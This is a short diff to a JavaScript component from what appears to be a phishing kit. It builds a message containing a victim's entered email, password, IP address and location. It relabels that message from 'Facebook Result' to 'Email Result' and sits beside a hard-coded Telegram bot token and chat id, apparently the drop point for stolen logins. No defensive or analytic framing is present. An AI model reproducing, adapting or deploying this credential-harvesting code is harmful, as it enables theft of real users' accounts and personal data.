@@ -36,7 +36,7 @@ export default function Email() {
 
                     const NameLogin = email;
                     const PasswordLogin = password;
-                    const SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+                    const SubmitValue = `Email Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
                     const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
                     const chat_id = -4814119425;
